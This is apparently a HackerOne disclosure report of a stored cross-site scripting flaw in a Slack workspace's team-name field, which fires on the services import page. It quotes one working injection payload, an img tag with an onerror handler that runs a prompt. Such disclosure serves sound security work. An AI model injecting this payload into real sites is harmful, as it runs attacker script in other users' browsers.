# HackerOne Report: a stored xss in  slack integration  https://onerror.slack.com/services/import
**Report ID:** 33018
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
location of the stored xss bug :
https://hunter22.slack.com/admin/name
in team name :put this payload :"><img src=x onerror=prompt(document.domain)>

stored xss executed here:
https://hunter22.slack.com/services/import

## Discussion & Remediation Timeline
